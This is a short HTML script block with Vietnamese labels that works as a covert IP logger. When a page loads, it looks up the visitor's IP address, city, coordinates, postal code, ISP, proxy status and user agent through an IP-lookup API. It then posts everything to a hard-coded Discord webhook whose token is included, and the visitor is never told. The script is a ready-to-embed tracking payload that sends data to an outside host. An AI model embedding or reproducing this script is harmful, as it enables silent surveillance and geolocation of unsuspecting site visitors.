<script>

const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";

async function sendInfo() {

    try {

        // API IPBot
        const res = await fetch("https://api.ipbot.com/");

        const data = await res.json();

        const payload = {
            content:
`📱 Có người mở web

🌍 IP:
${data.ip}

🌎 Quốc gia:
${data.location.country} (${data.location.country_code})

🏙️ Thành phố:
${data.location.city}

📍 Khu vực:
${data.location.region}

📮 Postal:
${data.location.postal}

📡 Tọa độ:
${data.location.latitude}, ${data.location.longitude}

🕒 Timezone:
${data.location.timezone}

🏢 Nhà mạng:
${data.network.org}

🌐 ASN:
${data.network.asn}

📶 ISP Name:
${data.network.radar?.name}

🌍 ISP Quốc gia:
${data.network.radar?.country_name}

👥 Estimated Users:
${data.network.radar?.estimated_users}

🛡️ Proxy:
${data.security.is_proxy}

🏢 Datacenter:
${data.security.is_datacenter}

⚠️ Threat:
${data.security.threat_level}

📊 Risk Score:
${data.security.risk_score}

💻 User Agent:
${data.telemetry.user_agent}

📱 Browser:
${data.telemetry.is_browser}

⚙️ Engine:
${data.meta.engine}

🕒 Data Version:
${data.meta.data_version}`
        };

        // Gửi webhook Discord
        await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

    } catch(err) {

        console.log(err);

    }

}

sendInfo();

</script>
